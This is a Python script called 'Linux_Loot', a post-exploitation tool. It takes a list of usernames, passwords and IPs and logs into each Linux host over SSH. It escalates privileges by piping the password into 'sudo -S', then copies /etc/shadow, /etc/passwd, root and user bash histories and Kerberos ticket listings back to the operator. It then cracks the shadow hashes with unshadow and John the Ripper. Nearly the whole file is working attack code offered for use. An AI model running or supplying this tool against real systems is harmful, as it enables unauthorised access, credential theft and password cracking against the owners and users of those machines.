import os
import argparse
import paramiko as paramiko
from psycopg2 import Error
import subprocess


class Linux_Loot:
    def __init__(self):
        self.targets = None
        self.opt = None

    # Getting arguments from command line
    @staticmethod
    def get_args():
        parser = argparse.ArgumentParser("This script collects juicy loot from remote linux machines")
        parser.add_argument("-f", "--file",
                            help="file with space separated credentials: <username> <password> <ip> [<port>]",
                            required=True)

        # privilege escalation
        parser.add_argument("-p", "--privesc", help="privesc method: ss - sudo su; <??> - ??", default='ss')
        return parser.parse_args()

    # Parse input file content
    def parse_list(self):
        params = open(self.opt.file, 'r')
        targets = []
        for line in params:
            if line != '\n':
                targets.append(line.rstrip().split(' '))
        return targets

    # Establish connection with single host
    def ssh_connect(self, host, user, pas, port):
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        try:
            ssh.connect(hostname=host, username=user, password=pas, port=port)
            print(f"[*] Connection established")
            return ssh

        except:
            print(f"[!] Could not establish connection with {host}:{port}")
            return False

    # Kill the connection
    def ssh_disconnect(self, con):
        con.close()

    # Execute sigle commad + escalation payload
    def ssh_exec(self, con, privesc, command):
        payload = privesc + command

        stdin, stdout, stderr = con.exec_command(payload)
        return stdout.read().decode()

    # Select priv escalation payload (for future modifications)
    def privesc_methods(self, pas):
        if self.opt.privesc == 'ss':
            return f' echo {pas} | sudo -S '
        else:
            print('[*] No such privesc method')
            return 1

    # Write dump about single host into file
    def loot_write(self, ip, name, data):
        os.makedirs(f"./Linux_Loot/{ip}", exist_ok=True)
        file = open(f'./Linux_Loot/{ip}/{name}', 'w')
        file.write(data)
        file.close()

    # Collect loot from single host
    def collect_loot(self, target):
        try:
            # Establish connection with server
            if len(target) == 4:
                ssh = self.ssh_connect(target[2], target[0], target[1], target[3])
                print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:{target[3]}')
            else:
                ssh = self.ssh_connect(target[2], target[0], target[1], '22')
                print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:22')

            # Break if connection wasn't established
            if not ssh:
                return False

            # Execute command
            pe = self.privesc_methods(target[1])

            loot_file_list = ['tail -n +1 /etc/passwd', 'tail -n +1 /etc/shadow', 'tail -n +1 /root/.bash_history',
                              'tail -n +1 /home/*/.bash_history', 'tail -n +1 /etc/hosts',
                              'tail -n +1 /etc/resolv.conf', 'klist']
            for command in loot_file_list:
                # Write loot to the file
                self.loot_write(target[2], command.split()[-1][1:].replace("/", "_") if command.split()[-1] != 'klist' else 'klist', self.ssh_exec(ssh, pe, command))

            # Close connection
            self.ssh_disconnect(ssh)
            print("[+] Success!")

        except (Exception, Error) as error:
            print("[!] Operation failed: ", error)

    # Brute force hashes
    def brute_force(self):
        for target in self.targets:
            # Launching john
            os.system(f'unshadow ./Linux_Loot/{target[2]}/etc_passwd ./Linux_Loot/{target[2]}/etc_shadow | cut -d: -f1,2 > ./Linux_Loot/{target[2]}/user_hash.txt')
            proc = subprocess.Popen(['john', '--wordlist=/usr/share/seclists/Passwords/500-worst-passwords.txt', f'./Linux_Loot/{target[2]}/user_hash.txt'], stdout=subprocess.PIPE, text=True)
            proc.wait()
            output, errors = (proc.communicate())

            # Error handling
            if errors is not None:
                print("[!] Operation failed: ", errors)

            # Write loot to the file
            self.loot_write(target[2], 'john_brute.txt', output.rstrip())

    # Try to collect loot from all given hosts
    def loot_all_hosts(self):
        print('+----------------------TARGETS-----------------------+')
        self.targets = self.parse_list()
        for target in self.targets:
            self.collect_loot(target)
        print('+-----------------------BRUTE------------------------+')
        self.brute_force()
        print("+----------------------------------------------------+")

    def main(self):
        self.opt = Linux_Loot.get_args()
        self.loot_all_hosts()


if __name__ == "__main__":
    loot = Linux_Loot()
    loot.main()
